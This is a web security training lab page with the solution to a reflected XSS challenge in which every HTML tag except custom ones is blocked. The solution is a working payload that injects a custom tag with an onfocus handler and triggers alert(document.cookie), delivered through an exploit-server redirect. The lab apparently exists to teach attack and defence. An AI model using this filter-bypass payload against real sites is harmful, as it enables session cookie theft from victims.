# Lab: Reflected XSS into HTML context with all tags blocked except custom ones

This lab blocks all HTML tags except custom ones.

To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts `document.cookie`.

####  Solution

-

Go to the exploit server and paste the following code, replacing `YOUR-LAB-ID` with your lab ID:

```
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```

-  Click "Store" and "Deliver exploit to victim".

This injection creates a custom tag with the ID `x`, which contains an `onfocus` event handler that triggers the `alert` function. The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the `alert` payload to be called.

####  Community solutions

z3nsh3ll

Michael Sommer
